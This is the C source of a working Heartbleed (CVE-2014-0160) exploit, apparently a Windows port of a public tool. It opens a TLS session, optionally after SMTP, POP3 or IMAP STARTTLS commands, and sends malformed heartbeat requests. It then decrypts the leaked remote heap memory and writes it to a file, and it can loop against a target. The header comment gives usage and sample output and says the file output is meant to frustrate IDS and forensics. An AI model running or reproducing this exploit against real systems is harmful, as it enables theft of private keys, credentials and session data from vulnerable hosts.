/* 
* CVE-2014-0160 heartbleed OpenSSL information leak exploit
* =========================================================
* This exploit uses OpenSSL to create an encrypted connection
* and trigger the heartbleed leak. The leaked information is
* returned within encrypted SSL packets and is then decrypted 
* and wrote to a file to annoy IDS/forensics. The exploit can 
* set heartbeat payload length arbitrarily or use two preset 
* values for NULL and MAX length. The vulnerability occurs due 
* to bounds checking not being performed on a heap value which 
* is user supplied and returned to the user as part of DTLS/TLS 
* heartbeat SSL extension. All versions of OpenSSL 1.0.1 to 
* 1.0.1f are known affected. You must run this against a target 
* which is linked to a vulnerable OpenSSL library using DTLS/TLS.
* This exploit leaks upto 65532 bytes of remote heap each request
* and can be run in a loop until the connected peer ends connection.
* The data leaked contains 16 bytes of random padding at the end.
* The exploit can be used against a connecting client or server,
* it can also send pre_cmd's to plain-text services to establish
* an SSL session such as with STARTTLS on SMTP/IMAP/POP3. Clients
* will often forcefully close the connection during large leak
* requests so try to lower your payload request size. 
*
* Compiled on ArchLinux x86_64 gcc 4.8.2 20140206 w/OpenSSL 1.0.1g 
*
* E.g.
* $ gcc -lssl -lssl3 -lcrypto heartbleed.c -o heartbleed
* $ ./heartbleed -s 192.168.11.23 -p 443 -f out -t 1
* [ heartbleed - CVE-2014-0160 - OpenSSL information leak exploit
* [ =============================================================
* [ connecting to 192.168.11.23 443/tcp
* [ connected to 192.168.11.23 443/tcp
* [ <3 <3 <3 heart bleed <3 <3 <3
* [ heartbeat returned type=24 length=16408
* [ decrypting SSL packet
* [ heartbleed leaked length=65535
* [ final record type=24, length=16384
* [ wrote 16381 bytes of heap to file 'out'
* [ heartbeat returned type=24 length=16408
* [ decrypting SSL packet
* [ final record type=24, length=16384
* [ wrote 16384 bytes of heap to file 'out'
* [ heartbeat returned type=24 length=16408
* [ decrypting SSL packet
* [ final record type=24, length=16384
* [ wrote 16384 bytes of heap to file 'out'
* [ heartbeat returned type=24 length=16408
* [ decrypting SSL packet
* [ final record type=24, length=16384
* [ wrote 16384 bytes of heap to file 'out'
* [ heartbeat returned type=24 length=42
* [ decrypting SSL packet
* [ final record type=24, length=18
* [ wrote 18 bytes of heap to file 'out'
* [ done.
* $ ls -al out
* -rwx------ 1 fantastic fantastic 65554 Apr 11 13:53 out
* $ hexdump -C out
* - snip - snip  
* 
* $ openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
* -keyout server.key -out server.crt
*
* Debian compile with "gcc heartbleed.c -o heartbleed -Wl,-Bstatic \
* -lssl -Wl,-Bdynamic -lssl3 -lcrypto" 
*
* todo: add udp/dtls support.
*
* - Hacker Fantastic
*   http://www.mdsec.co.uk
*
*-------------------------------------------------------------------------------
* Modified by @bluerust
* Date    : 2014-04-27
* Compile : cl /EHsc /MT /Zi heartbleed.c getopt_long.c /link /subsystem:console /OPT:REF /PDB:heartbleed.pdb 
*
*/

#define _WIN32_WINNT                     0x0600
#define _CRT_SECURE_NO_WARNINGS
#define _CRT_NON_CONFORMING_SWPRINTFS


/************************************************************************
 *                                                                      *
 *                               Head File                              *
 *                                                                      *
 ************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "getopt.h"
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/tls1.h>
#include <openssl/rand.h>
#include <openssl/buffer.h>


/************************************************************************
 *                                                                      *
 *                               Macro                                  *
 *                                                                      *
 ************************************************************************/
 
#pragma comment( linker, "/INCREMENTAL:NO"      )
#pragma comment( linker, "/merge:.rdata=.text"  )
#pragma comment( linker, "/subsystem:console"   )
#pragma comment( lib,    "user32.lib"           )
#pragma comment( lib,    "ws2_32.lib"           )
#pragma comment( lib,    "libeay32.lib"         )
#pragma comment( lib,    "ssleay32.lib"         )
#pragma comment( lib,    "gdi32.lib"            )
#pragma comment( lib,    "Advapi32.lib"         )


typedef unsigned int    uint;
typedef struct 
{
    int                 socket;
    SSL                *sslHandle;
    SSL_CTX            *sslContext;
} connection;

typedef struct 
{
    unsigned char       type;
    short               version;
    unsigned int        length;
    unsigned char       hbtype;
    unsigned int        payload_length;
    void               *payload;
} heartbeat;


#define n2s(c,s)((s=((((unsigned char)(c[0]))<< 8)|        \
        (((unsigned char)(c[1]))    ))),c+=2)
#define s2n(s,c) ((c[0]=(unsigned char)(((s)>> 8)&0xff), \
         c[1]=(unsigned char)(((s)    )&0xff)),c+=2)

/************************************************************************
 *                                                                      *
 *                            Function Prototype                        *
 *                                                                      *
 ************************************************************************/
int                     ssl3_write_bytes
( 
    SSL                *s, 
    int                 type, 
    const void         *buf,
    int                 len
);
static void             ssl_init
(
    void
);
static void             hexdump
(
    FILE               *out,
    unsigned char      *in,
    unsigned int        insize,
    unsigned int        count
);
static void             usage
(
    void
);
static int              tcp_connect
(
    char               *server,
    int                 port
);
static connection*      tls_connect
(
    int                 sd
);
static int              pre_cmd
(
    int                 sd,
    int                 precmd
);
static void *           heartbleed
(
    connection         *c,
    unsigned int        type
);
static void *           sneakyleaky
(
    connection         *c
);


/************************************************************************
 *                                                                      *
 *                            Static Global Var                         *
 *                                                                      *
 ************************************************************************/
 
static int              g_first         = 0;
static int              g_leakbytes     = 0;
static int              g_repeat        = 1;
static int              g_badpackets    = 0;
static int              g_verbose       = 0;
static int              g_fd            = -1; 
static char            *filename        = NULL;


/************************************************************************/
static int              tcp_connect
(
    char               *server,
    int                 port
)
{
    int                 sd,ret;
    struct hostent     *host;
    struct sockaddr_in  sa;
    
    host           = gethostbyname( server );
    sd             = socket(AF_INET, SOCK_STREAM, 0);
    if( sd == -1 )
    {
        printf("[!] cannot create socket\n");
        exit(0);
    }
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(port);
    sa.sin_addr   = *((struct in_addr *) host->h_addr);
    memset(&(sa.sin_zero), 0, 8);
    printf("[ connecting to %s %d/tcp\n",server,port);
    
    ret           = connect(sd,(struct sockaddr *)&sa, sizeof(struct sockaddr));
    if ( ret == 0 )
    {
        printf("[ connected to %s %d/tcp\n",server,port);
    }
    else
    {
        printf("[!] FATAL: could not connect to %s %d/tcp\n",server,port);
        exit(0);
    }
    
    return sd;
    
} /* end of tcp_connect */



static void             ssl_init
(
    void
)
{
    SSL_load_error_strings();
    SSL_library_init();
    OpenSSL_add_all_digests();
    OpenSSL_add_all_algorithms();
    OpenSSL_add_all_ciphers();
} /* end of ssl_init */


/*
 * 2006-06-09 11:09 scz
 *
 * 这个版本不支持汉字
 */
static void             hexdump
(
    FILE               *out,
    unsigned char      *in,
    unsigned int        insize,
    unsigned int        count
)
{
    unsigned int    offset, k, j, i, m;

    if ( insize <= 0 || count <= 0 || NULL == in || NULL == out )
    {
        return;
    }
    fprintf( out, "[ %u bytes ] -> %u bytes per line\n", insize, count );
    i       = 0;
    offset  = 0;
    m       = ( count + 1 ) / 2;
    for ( k = insize / count; k > 0; k--, offset += count )
    {
        fprintf( out, "%08X ", offset );
        for ( j = 0; j < count; j++, i++ )
        {
            if ( m == j )
            {
                fprintf( out, "-%02X", in[i] );
            }
            else
            {
                fprintf( out, " %02X", in[i] );
            }
        }
        fprintf( out, "    " );
        i  -= count;
        for ( j = 0; j < count; j++, i++ )
        {
            /*
             * if ( isprint( ( int )in[i] ) )
             */
#if 0
            if ( ( in[i] >= ' ' ) && ( in[i] != 0x7F ) && ( in[i] < 0xFF ) )
#else
            if ( ( in[i] >= ' ' ) && ( in[i] < 0x7F ) )
#endif
            {
                fprintf( out, "%c", in[i] );
            }
            else
            {
                fprintf( out, "." );
            }
        }
        fprintf( out, "\n" );
    }  /* end of for */
    k       = insize - i;
    if ( k <= 0 )
    {
        return;
    }
    fprintf( out, "%08X ", offset );
    for ( j = 0 ; j < k; j++, i++ )
    {
        if ( m == j )
        {
            fprintf( out, "-%02X", in[i] );
        }
        else
        {
            fprintf( out, " %02X", in[i] );
        }
    }
    i      -= k;
    for ( j = count - k; j > 0; j-- )
    {
        fprintf( out, "   " );
    }
    fprintf( out, "    " );
    for ( j = 0; j < k; j++, i++ )
    {
#if 0
        if ( ( in[i] >= ' ' ) && ( in[i] != 0x7F ) && ( in[i] < 0xFF ) )
#else
        if ( ( in[i] >= ' ' ) && ( in[i] < 0x7F ) )
#endif
        {
            fprintf( out, "%c", in[i] );
        }
        else
        {
            fprintf( out, "." );
        }
    }
    fprintf( out, "\n" );
    return;
}  /* end of hexdump */


static connection*      tls_connect
(
    int                 sd
)
{
    connection    *c;
    c = malloc( sizeof(connection) );
    
    if ( c == NULL )
    {
        printf("[ error in malloc()\n");
        exit(0);
    }
    
    c->socket         = sd;
    c->sslHandle     = NULL;
    c->sslContext     = NULL;
    c->sslContext     = SSL_CTX_new(SSLv23_client_method());
    
    SSL_CTX_set_options(c->sslContext, SSL_OP_ALL | SSL_OP_NO_SSLv2 );
    if    ( c->sslContext == NULL )
    {
        ERR_print_errors_fp(stderr);
    }
    
    c->sslHandle = SSL_new(c->sslContext);
    if ( c->sslHandle == NULL )
    {
        ERR_print_errors_fp(stderr);
    }
    
    if(!SSL_set_fd(c->sslHandle,c->socket) )
    {
        ERR_print_errors_fp(stderr);
    }

    if( SSL_connect(c->sslHandle) != 1 )
    {
        ERR_print_errors_fp(stderr);
    }
    
    if( !c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED ||
         c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS
      )
    {
        printf("[ warning: heartbeat extension is unsupported (try anyway)\n");
    }

    return c;
    
} /* end of tls_connect */


static int              pre_cmd
(
    int                 sd,
    int                 precmd
)
{
    /* this function can be used to send commands to a plain-text
    service or client before heartbleed exploit attempt. e.g. STARTTLS */
    int          rc, go = 0;
    char        *buffer;
    char        *line1;
    char        *line2; 
    
    switch(precmd)
    {
    case 0:
        line1 = "EHLO test\n";
        line2 = "STARTTLS\n";
        break;
    case 1:
        line1 = "CAPA\n";
        line2 = "STLS\n";
        break;
    case 2:
        line1 = "a001 CAPB\n";
        line2 = "a002 STARTTLS\n";
        break;
    default:
        go = 1;
        break;
    }
    
    if ( go == 0 )
    {
        buffer = malloc(2049);
        if ( buffer == NULL )
        {
            printf("[ error in malloc()\n");
            exit(0);
        }
        
        memset(buffer,0,2049);
        rc         = read(sd,buffer,2048);
        printf("[ banner: %s",buffer);
        send(sd,line1,strlen(line1),0);
        memset(buffer,0,2049);
        rc         = read(sd,buffer,2048);
        if    ( g_verbose == 1 )
        {
            printf("%s\n",buffer);
        }
        
        send( sd, line2, strlen(line2), 0 );
        memset( buffer, 0, 2049 );
        rc         = read( sd, buffer, 2048 );
        if(    g_verbose == 1 )
        {
            printf("%s\n",buffer);
        }
    }
    
    return sd;
} /* end of pre_cmd */


static void *           heartbleed
(
    connection         *c,
    unsigned int        type
)
{
    unsigned char      *buf, *p;
    int                 ret;
    
    buf  = OPENSSL_malloc( 1 + 2 );
    if ( buf == NULL )
    {
        printf("[ error in malloc()\n");
        exit(0);
    }
    
    p    = buf;
    *p++ = TLS1_HB_REQUEST;
    
    switch(type)
    {
    case 0:
        s2n(0x0,p);
        break;
    case 1:
        s2n(0xffff,p);
        break;
    default:
        printf("[ setting heartbeat payload_length to %u\n",type);
        s2n(type,p);
    break;
    }
    
    printf( "[ <3 <3 <3 heart bleed <3 <3 <3\n" );
    ret = ssl3_write_bytes( c->sslHandle, 
                            TLS1_RT_HEARTBEAT, 
                            buf, 
                            3 );
    
    OPENSSL_free( buf );
    return c;
    
} /* end of heartbleed */


/*
 * non thread safe
 */
static void *           sneakyleaky
(
    connection         *c
)
{
    char               *p;
    int                 ssl_major,ssl_minor,al;
    int                 enc_err = 0,n,i;
    SSL3_RECORD        *rr;
    SSL_SESSION        *sess;
    SSL                *s;
    unsigned char       md[EVP_MAX_MD_SIZE];
    short               version;
    unsigned            mac_size,
                        orig_len;
    int                 output;
    size_t              extra;
    char                testc = 5;
    
    rr        = &c->sslHandle->s3->rrec;
    sess      = c->sslHandle->session;
    s         = c->sslHandle;
    
    if ( c->sslHandle->options & SSL_OP_MICROSOFT_BIG_SSLV3_BUFFER )
    {
        extra=SSL3_RT_MAX_EXTRA;
    }
    else
    {
        extra=0;
    }
        
    // #define SSL3_RT_HEADER_LENGTH            5
    if ( (s->rstate != SSL_ST_READ_BODY)             ||
         (s->packet_length < SSL3_RT_HEADER_LENGTH)
       ) 
    {
        n            = ssl3_read_n(s, SSL3_RT_HEADER_LENGTH, s->s3->rbuf.len, 0);
        if (n <= 0)
        {
            printf( "[!] %s:%d ", __FILE__, __LINE__ );
            goto apple; 
        }
        s->rstate    =  SSL_ST_READ_BODY;
        p            =  s->packet;
        rr->type     = *(p++);
        ssl_major    = *(p++);
        ssl_minor    = *(p++);
        version      =  (ssl_major<<8)|ssl_minor;
        
        if ( g_verbose == 1 )
        {
            hexdump( stdout, p, SSL3_RT_HEADER_LENGTH, 16 );
        }
        
        n2s( p, (unsigned int)rr->length );

        printf("[  length=%8.8x %p\n", ((((unsigned char)testc) << 8 ) | (unsigned char)p[1]), p );
        
        if(    rr->type == 24 )
        {
            printf("[ heartbeat returned type=%d length=%8.8x\n", rr->type, rr->length);
            if( rr->length > 16834 )
            {
                printf("[ error: got a malformed TLS length.\n");
                exit( 0 );
            }
        }
        else
        {
            printf("[ incorrect record type=%d length=%u returned\n",rr->type,rr->length);
            s->packet_length = 0;
            g_badpackets++;
            if( g_badpackets > 3)
            {
                printf("[ error: too many bad packets recieved\n");
                exit(0);
            }
            printf( "%s: %d ", __FILE__, __LINE__ );
            goto apple;
        }
    }
    
    if (rr->length > s->packet_length-SSL3_RT_HEADER_LENGTH)
    {
        i = rr->length;
        n = ssl3_read_n( s, i, i, 1 );
        if (n <= 0 ) 
        {
            printf( "[!] %s:%d ", __FILE__, __LINE__ );
            goto apple; 
        }
    }
    
    printf( "[ decrypting SSL packet...\n" );
    s->rstate = SSL_ST_READ_HEADER; 
    rr->input = &(s->packet[SSL3_RT_HEADER_LENGTH]);
    rr->data  = rr->input;
    
    if ( g_verbose == 1 )
    {
        hexdump( stdout, rr->data, rr->length, 16 );
    }
    
    version > 0x0300 ? tls1_enc(s,0) : ssl3_enc(s, 0 );
    if( (sess                        != NULL ) &&
        (s->enc_read_ctx              != NULL ) &&
        (EVP_MD_CTX_md(s->read_hash) != NULL)
      )
    {
        unsigned char *mac     = NULL;
        unsigned char mac_tmp[EVP_MAX_MD_SIZE];
        
        mac_size            = EVP_MD_CTX_size(s->read_hash);
        OPENSSL_assert( mac_size <= EVP_MAX_MD_SIZE );
        orig_len             = rr->length + ((unsigned int)rr->type>>8);
        if( orig_len < mac_size                                         ||
            ( EVP_CIPHER_CTX_mode(s->enc_read_ctx) == EVP_CIPH_CBC_MODE &&
             orig_len < mac_size+1
            )
          )
        {
            al = SSL_AD_DECODE_ERROR;
            SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_LENGTH_TOO_SHORT);
        }
        
        if ( EVP_CIPHER_CTX_mode(s->enc_read_ctx) == EVP_CIPH_CBC_MODE )
        {
            mac         = mac_tmp;
            ssl3_cbc_copy_mac(mac_tmp, rr, mac_size, orig_len);
            rr->length -= mac_size;
        }
        else
        {
            rr->length -= mac_size;
            mac = &rr->data[rr->length];
        }

        i = (version > 0x0300 ? tls1_mac(s,md,0) : n_ssl3_mac( s, md, 0 ));
        printf( "mac %s\n", CRYPTO_memcmp(md, mac, (size_t)mac_size)? "incorrect": "correct!" );
    
        if ( i   <  0                                           || 
             mac == NULL                                     || 
             CRYPTO_memcmp(md, mac, (size_t)mac_size) != 0  || 
             ( rr->length > SSL3_RT_MAX_COMPRESSED_LENGTH+extra+mac_size )
            )
        {
            printf( "[!] %s:%d enc_err = -1, i: %d, mac: %8.8x\n", __FILE__, __LINE__, i, mac );
            enc_err = -1;
        }
        
    }
    
    if( enc_err < 0 )
    {
        al    = SSL_AD_BAD_RECORD_MAC;
        SSLerr( SSL_F_SSL3_GET_RECORD,
                SSL_R_DECRYPTION_FAILED_OR_BAD_RECORD_MAC );
                
        printf( "[!] %s:%d ", __FILE__, __LINE__ );
        goto apple;
    }
    
    if(s->expand != NULL)
    {
        if (rr->length > SSL3_RT_MAX_COMPRESSED_LENGTH+extra) 
        {
            al=SSL_AD_RECORD_OVERFLOW;
            SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_COMPRESSED_LENGTH_TOO_LONG);
            printf( "[!] %s:%d ", __FILE__, __LINE__ );
            goto apple;
        }
        if (!ssl3_do_uncompress(s)) 
        {
            al=SSL_AD_DECOMPRESSION_FAILURE;
            SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_BAD_DECOMPRESSION);
            printf( "[!] %s:%d ", __FILE__, __LINE__ );
            goto apple;
        }
    }
    
    if (rr->length > SSL3_RT_MAX_PLAIN_LENGTH+extra) 
    {
        al=SSL_AD_RECORD_OVERFLOW;
        SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_DATA_LENGTH_TOO_LONG);
        printf( "[!] %s:%d ", __FILE__, __LINE__ );
        goto apple;
    }
    
    rr->off          = 0;
    s->packet_length = 0;
    
    if ( g_first == 0 )
    {
        uint heartbleed_len = 0;
        char* fp            = s->s3->rrec.data;
        (long)fp++;
        memcpy( &heartbleed_len, fp, 2 );
        heartbleed_len      = (heartbleed_len & 0xff) << 8 | (heartbleed_len & 0xff00) >> 8;
        g_first++;
        g_leakbytes         = heartbleed_len + 16;
        printf("[ heartbleed leaked length=%u\n",heartbleed_len);
    }
    
    if( g_verbose == 1 )
    {
        hexdump( stdout, rr->data, rr->length, 16 );
        printf("\n");
    }
    
    g_leakbytes -= rr->length;
    if ( g_leakbytes > 0 )
    {
        g_repeat = 1;
    }
    else
    {
        g_repeat = 0;
    }
    
    printf("[ final record type=%d, length=%u\n", rr->type, rr->length);
    output = s->s3->rrec.length-3;
    
    if ( output > 0  && g_fd != -1 )
    {
        if ( g_first == 1 )
        {
            // g_first three bytes are resp+len 
            if ( g_repeat == 1 )
            {
                write( g_fd,s->s3->rrec.data+3, s->s3->rrec.length - 3);
                printf("[ wrote %d bytes of heap to file '%s'\n", s->s3->rrec.length-3, filename );
            }
            else
            {

                write( g_fd, s->s3->rrec.data + 3, s->s3->rrec.length - 16 - 3 );    

                printf( "[ wrote %d bytes of heap to file '%s'\n", s->s3->rrec.length - 16 - 3, filename );

            }

            g_first++;
        }
        else if ( g_repeat )
        {
            // heap data & 16 bytes padding 

            write( g_fd, s->s3->rrec.data, s->s3->rrec.length );    
            //write(fd, rr->data, rr->length);
            printf( "[ wrote %d bytes of heap to file '%s'\n", s->s3->rrec.length, filename );
        }
        else
        {
            write( g_fd, s->s3->rrec.data, s->s3->rrec.length - 16 );
            printf( "[ wrote %d bytes of heap to file '%s'\n", s->s3->rrec.length - 16, filename );
        }
    }
    else
    {
        printf("[ nothing from the heap to write\n");
    }
    
    return    0;
    
apple:
    printf("[ problem handling SSL record packet - wrong type?\n");
    g_badpackets++;
    if( g_badpackets > 3 )
    {
        printf("[ error: too many bad packets recieved\n");
        exit( 0 );
    }
    
    return 0;
    
} /* end of sneakyleaky */


static void                usage
(
    void
)
{
    printf("[\n");
    printf("[ --server|-s <ip/dns>    - the server to target\n"         );
    printf("[ --port|-p   <port>      - the port to target\n"           );
    printf("[ --file|-f   <filename>  - file to write data to\n"        );
    printf("[ --precmd|-c <n>         - send precmd buffer (STARTTLS)\n");
    printf("[                0 = SMTP\n"                                );
    printf("[                1 = POP3\n"                                );
    printf("[                2 = IMAP\n"                                );
    printf("[ --loop|-l          - loop the exploit attempts\n"         );
    printf("[ --type|-t   <n>         - select exploit to try\n"        );
    printf("[                           0 = null length\n"              );
    printf("[                1 = max leak\n"                            );
    printf("[                n = heartbeat payload_length\n"            );
    printf("[\n"                                                        );
    printf("[ --verbose|-v            - output leak to screen\n"        );
    printf("[ --help|-h               - this output\n"                  );
    printf("[\n");
    exit(0);
} /* end of usage */


int __cdecl             main( int argc, char* argv[] )
{
    int                 ret, 
                        port, 
                        index,
                        userc   = 0,
                        type    = 1,
                        udp     = 0,
                        bind    = 0,
                        precmd  = 9,
                        loop    = 0,
                        ihost   = 0,
                        iport   = 0,
                        ifile   = 0, 
                        itype   = 0, 
                        iprecmd = 0;
    struct hostent     *h;
    connection         *c;
    char               *host    = NULL;
    WSADATA             stWsaData; 
    
    static struct option options[] = 
    {
        {"server" , 1, 0, 's'},
        {"port"   , 1, 0, 'p'},
        {"file"   , 1, 0, 'f'},
        {"type"   , 1, 0, 't'},
        {"verbose", 0, 0, 'v'},
        {"precmd" , 1, 0, 'c'},
        {"loop"   , 0, 0, 'l'},
        {"help"   , 0, 0, 'h'}
    };

    printf( "[ heartbleed - CVE-2014-0160 - OpenSSL information leak exploit\n" );
    printf( "[ =============================================================\n" );

    WSAStartup( 0x101, &stWsaData );
    
    while ( userc != -1 ) 
    {
        userc = getopt_long(argc,argv,"s:p:f:t:c:lvh",options,&index);    
        switch(userc) 
        {
        case -1:
            break;
        case 's':
            if( host == NULL )
            {
                h       = gethostbyname(optarg);                
                if ( h == NULL )
                {
                    printf("[!] FATAL: unknown host '%s'\n",optarg);
                    exit(1);
                }
                
                host = strdup( optarg );
                if ( host == NULL )
                {
                    printf("[ error in strdup()\n");
                    exit(0);
                }
                
            }
            break;
        case 'p':
            if(iport==0)
            {
                port  = atoi(optarg);
                iport = 1;
            }
            break;
        case 'f':
            if( filename == NULL )
            {
                filename = strdup( optarg );
                if ( filename == NULL )
                {
                    printf("[ error in strdup()\n");
                    exit(0);
                }
            }
            break;
        case 't':
            if ( itype == 0 )
            {
                type  = atoi( optarg );
                itype = 1;
            }
            break;
        case 'h':
            usage();
            break;
        case 'c':
            if ( iprecmd == 0 )
            {
                iprecmd = 1;
                precmd = atoi(optarg);
            }
            break;
        case 'v':
            g_verbose = 1;
            break;
        case 'l':
            loop = 1;
            break;
        default:
            break;
        }
    }
    if ( host == NULL ||
         iport == 0   ||
         itype == 0
       )
    {
        printf("[ try --help\n");
        exit(0);
    }
    
    if ( filename )
    {
        g_fd = open( filename, O_RDWR|O_CREAT|O_APPEND, 0700 );
        if ( g_fd == -1 )
        {
            fprintf( stderr, "[!] open %s failed!\n", filename );
        }
    }
    
    ssl_init();

    ret = tcp_connect(host, port);
    pre_cmd(ret, precmd );
    c   = tls_connect(ret);
    
    do
    {
        g_first  = 0;
        g_repeat = 1;
        heartbleed( c, type );
        while ( g_repeat == 1 )
        {
            sneakyleaky( c );
        }
    } while ( loop );
    
    printf( "[ done.\n" );
    
    if ( filename && g_fd != -1 )
    {
        close( g_fd );
        free( filename );
        filename = NULL;
    }
    
    WSACleanup();
    exit( 0 );

} /* end of main */
